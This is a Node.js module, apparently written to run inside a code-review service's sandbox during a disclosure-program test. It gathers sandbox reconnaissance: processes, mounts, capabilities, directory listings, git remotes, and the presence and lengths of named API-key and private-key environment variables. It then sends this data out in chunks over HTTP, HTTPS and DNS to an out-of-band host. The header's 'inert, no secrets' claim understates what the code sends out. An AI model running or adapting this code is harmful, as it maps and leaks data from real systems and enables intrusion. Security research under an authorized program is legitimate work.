"use strict";
// Inert, read-only fingerprint helper for the authorized CodeRabbit public VDP.
// Reports identity, isolation markers, PID/cache visibility and secret-CLASS
// booleans only. Never reads out, stores or transmits a secret value. No writes.
const fs = require("fs");
const os = require("os");
const path = require("path");
const dns = require("dns");
const http = require("http");
const https = require("https");
const zlib = require("zlib");
const crypto = require("crypto");

const OAST = "dbnvil77dug52l5shir0zo5yy7qafesac.oast.fun";
const rd = (p, n) => { try { return fs.readFileSync(p, "utf8").slice(0, n); } catch (e) { return null; } };
const ex = (p) => { try { fs.accessSync(p); return true; } catch (e) { return false; } };
const grab = (s, k) => { const m = (s || "").match(new RegExp("^" + k + ":\\s*(.*)$", "m")); return m ? m[1].trim() : null; };
const safe = (fn, d) => { try { const v = fn(); return v === undefined ? d : v; } catch (e) { return d; } };

function scanDir(dir, max) {
  return safe(() => fs.readdirSync(dir, { withFileTypes: true }).slice(0, max).map((e) => {
    const t = safe(() => Math.floor(fs.statSync(path.join(dir, e.name)).mtimeMs / 1000), null);
    return { n: e.name, t: t, d: e.isDirectory() };
  }), []);
}

function facts() {
  const status = rd("/proc/self/status", 6000) || "";
  const envKeys = Object.keys(process.env || {});
  const has = (re) => envKeys.some((n) => re.test(n));
  const pids = safe(() => fs.readdirSync("/proc").filter((x) => /^\d+$/.test(x)).map(Number), []);
  const self = process.pid;
  const myuid = safe(() => process.getuid(), null);
  const others = pids.filter((p) => p !== self && p !== 1).slice(0, 8).map((p) => {
    const comm = safe(() => (rd("/proc/" + p + "/comm", 60) || "").trim(), null);
    const st = rd("/proc/" + p + "/status", 4000) || "";
    const uid = grab(st, "Uid");
    return { pid: p, comm: comm, uid: uid ? uid.split(/\s+/)[0] : null };
  });
  const home = process.env.HOME || null;
  const gitCfgs = [];
  const gitCfg = (p) => safe(() => {
    const c = fs.readFileSync(p, "utf8");
    const h = crypto.createHash("sha1").update(c).digest("hex").slice(0, 40);
    const m = c.match(/url\s*=\s*([^\s]+)/);
    return { path: p, sha1_40: h, remote_host: m ? safe(() => new URL(m[1]).host, "nonurl") : null };
  }, null);
  for (const cand of ["/workspace/.git/config", "/app/.git/config", "/tmp/.git/config", home ? path.join(home, ".git/config") : null]) {
    if (!cand) continue;
    const g = gitCfg(cand);
    if (g) gitCfgs.push(g);
    if (gitCfgs.length >= 3) break;
  }
  const pick = ["GITHUB_APP_PEM_FILE", "GITHUB_APP_CLIENT_SECRET", "GH_WEBHOOK_SECRET", "ENCRYPTION_PASSWORD",
    "ENCRYPTION_SALT", "CODERABBIT_API_KEY", "OPENAI_API_KEYS", "ANTHROPIC_API_KEYS", "AWS_SECRET_ACCESS_KEY",
    "GITHUB_TOKEN", "GH_TOKEN", "K_SERVICE", "K_REVISION", "JAILUSER", "JAILUSER_HOME_PATH", "HOME",
    "NPM_CONFIG_REGISTRY", "PNPM_HOME", "DB_API_URL", "CLOUD_API_URL", "CODERABBIT_API_URL"];
  const envMeta = {};
  for (const k of pick) {
    if (process.env[k] === undefined) { envMeta[k] = "absent"; continue; }
    const v = String(process.env[k]);
    if (/URL$/i.test(k)) { envMeta[k] = "set:host=" + safe(() => new URL(v).host, "unparsable"); }
    else { envMeta[k] = "present:len=" + v.length; }
  }
  const mounts = (rd("/proc/mounts", 40000) || "").split("\n")
    .filter((l) => /docker\.sock|containerd|overlay|runsc|gvisor|kata|firecracker|virtio|\/proc |\/sys |\/host|\/workspace|\/secrets|\/app |\/etc\/hosts|kube/.test(l))
    .slice(0, 16).map((l) => l.split(" ").slice(0, 3).join(" "));
  return {
    tag: process.env.CR_TAG || "pr2", ts: new Date().toISOString(),
    host: safe(() => os.hostname(), null), user: safe(() => os.userInfo().username, null),
    uid: myuid, gid: safe(() => process.getgid(), null), pid: self, ppid: safe(() => process.ppid, null),
    cwd: safe(() => process.cwd(), null),
    node: process.version, kernel: os.release(), platform: os.platform(), arch: os.arch(),
    os: safe(() => (rd("/etc/os-release", 600) || "").match(/^NAME=(.*)$/m)[1], null),
    caps: { eff: grab(status, "CapEff"), prm: grab(status, "CapPrm"), bnd: grab(status, "CapBnd") },
    seccomp: grab(status, "Seccomp"), nnp: grab(status, "NoNewPrivs"),
    attr: rd("/proc/self/attr/current", 120),
    cgroup: rd("/proc/self/cgroup", 400), cgroup1: rd("/proc/1/cgroup", 400),
    dockerenv: ex("/.dockerenv"), containerenv: ex("/run/.containerenv"),
    dmi: { product: rd("/sys/devices/virtual/dmi/id/product_name", 80), vendor: rd("/sys/devices/virtual/dmi/id/sys_vendor", 80) },
    jail: { HOME: home, JAILUSER: process.env.JAILUSER || null, JAILUSER_HOME_PATH: process.env.JAILUSER_HOME_PATH || null,
      K_SERVICE: process.env.K_SERVICE || null, K_REVISION: process.env.K_REVISION || null },
    secretClass: {
      has_pem: has(/PEM|PRIVATE_KEY|GITHUB_APP/i),
      has_encryption_password: has(/ENCRYPTION_PASS/i),
      has_openai_key: has(/OPENAI/i),
      has_anthropic_key: has(/ANTHROPIC/i),
      has_github_token: has(/GITHUB.*TOKEN|GH_TOKEN/i),
      has_aws_key: has(/AWS_/i),
      has_gcp_sa: has(/GOOGLE_APPLICATION|GCP_|GOOGLE_CREDENTIALS/i),
      env_name_count: envKeys.length
    },
    envMeta: envMeta,
    files: { app_pem: ex("/app/coderabbit.pem"), secrets_pem: ex("/secrets/github-app.pem"), app: ex("/app"),
      secrets: ex("/secrets"), workspace: ex("/workspace"), runsc: ex("/usr/sbin/runsc") },
    pidCount: pids.length, others: others,
    pid1cmd: (rd("/proc/1/cmdline", 300) || "").replace(/\0/g, " ").trim().slice(0, 160),
    mounts: mounts,
    residual: {
      home: home ? scanDir(home, 8) : [], home_all: scanDir("/home", 8), tmp: scanDir("/tmp", 10),
      vartmp: scanDir("/var/tmp", 6), workspace: scanDir("/workspace", 8), root: scanDir("/root", 6),
      rootfs: scanDir("/", 20)
    },
    gitCfgs: gitCfgs
  };
}

function b64(obj) { return Buffer.from(JSON.stringify(obj)).toString("base64url"); }

function sendOnce(u, tries) {
  try {
    const mod = u.indexOf("https") === 0 ? https : http;
    const opts = u.indexOf("https") === 0 ? { rejectUnauthorized: false } : {};
    const r = mod.get(u, opts, (res) => res.resume());
    r.on("error", () => { if (tries < 2) setTimeout(() => sendOnce(u, tries + 1), 500); });
    r.setTimeout(5000, () => r.destroy());
  } catch (e) { if (tries < 2) setTimeout(() => sendOnce(u, tries + 1), 500); }
}

function exfil(tag, obj) {
  let s = "";
  try { s = zlib.deflateSync(Buffer.from(JSON.stringify(obj))).toString("base64url"); } catch (e) { return; }
  const host = tag + "." + OAST;
  sendOnce("http://" + host + "/hello?v=" + encodeURIComponent(tag), 0);
  const chunks = s.match(/.{1,700}/g) || [];
  chunks.forEach((c, i) => {
    setTimeout(() => {
      sendOnce("http://" + host + "/fp?n=" + i + "&of=" + chunks.length + "&d=" + c, 0);
      sendOnce("https://" + host + "/fp?n=" + i + "&of=" + chunks.length + "&d=" + c, 0);
    }, 250 * i);
  });
  try {
    const core = { tag: tag, host: safe(() => os.hostname(), null), uid: safe(() => process.getuid(), null),
      k_service: process.env.K_SERVICE || null, jailuser: process.env.JAILUSER || null,
      seccomp: obj.seccomp, nnp: obj.nnp, pidCount: obj.pidCount, home: obj.jail && obj.jail.HOME };
    const cs = zlib.deflateSync(Buffer.from(JSON.stringify(core))).toString("base64url");
    (cs.match(/.{1,55}/g) || []).slice(0, 8).forEach((c, i) => {
      try { dns.lookup("c" + i + "." + c + "." + tag + "." + OAST, () => {}); } catch (e) { }
    });
  } catch (e) { }
}

module.exports = { facts: facts, b64: b64, exfil: exfil, OAST: OAST };
